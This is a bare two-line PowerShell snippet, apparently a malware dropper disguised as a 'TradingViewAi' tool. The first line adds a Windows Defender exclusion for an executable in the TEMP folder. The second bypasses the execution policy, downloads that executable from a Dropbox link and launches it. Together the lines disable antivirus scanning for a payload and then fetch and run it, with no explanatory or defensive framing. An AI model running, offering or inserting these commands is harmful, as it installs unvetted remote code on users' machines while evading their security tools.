powershell -Command "Add-MpPreference -ExclusionPath \"$env:TEMP\TradingViewAi.exe\""
powershell -ExecutionPolicy Bypass -Command "$url='https://dl.dropboxusercontent.com/scl/fi/drzzp61bl26008twy8b7q/TradingViewAi.exe?rlkey=665z1qu57vo6v0sxddp7tpq32&st=sm6ps9d2'; $path=\"$env:TEMP\TradingViewAi.exe\"; Invoke-WebRequest -Uri $url -OutFile $path; Start-Process $path"
